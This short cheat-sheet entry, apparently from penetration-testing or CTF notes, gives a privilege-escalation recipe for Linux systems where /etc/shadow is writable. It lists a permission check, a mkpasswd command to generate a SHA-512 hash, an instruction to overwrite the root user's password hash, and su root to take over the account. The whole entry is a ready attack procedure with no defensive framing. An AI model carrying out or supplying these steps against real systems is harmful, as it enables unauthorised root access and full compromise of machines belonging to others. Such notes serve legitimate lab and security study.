- - -
### Writable /etc/Shadow  : 

###### Check to see If we can write to The shadow File.

```sh
ls -l /etc/shadow
```

#### Generate a new password hash with a password of your choice:

```sh
mkpasswd -m sha-512 newpasswordhere
```

**Edit** the /etc/shadow file and **replace** the original root user's password hash with the one you just generated.
Then;

```sh
su root
```

- - -

